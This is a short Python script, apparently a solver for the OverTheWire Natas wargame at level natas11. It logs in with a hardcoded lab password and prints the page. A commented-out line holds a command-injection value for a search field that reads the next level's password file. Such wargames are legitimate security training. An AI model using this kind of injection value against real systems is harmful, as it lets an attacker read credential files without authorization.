#!usr/bin/env python

import re
import requests

username = 'natas11'
password = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

#risultato = session.post(url, data = {"needle" : ". /etc/natas_webpass/natas11 #", "submit" : "submit" }, auth = (username, password))

risultato = session.get(url, auth = (username, password))

contenuto = risultato.text

print (contenuto)
#print (re.findall('<pre>\n(.*)\n', contenuto) [0])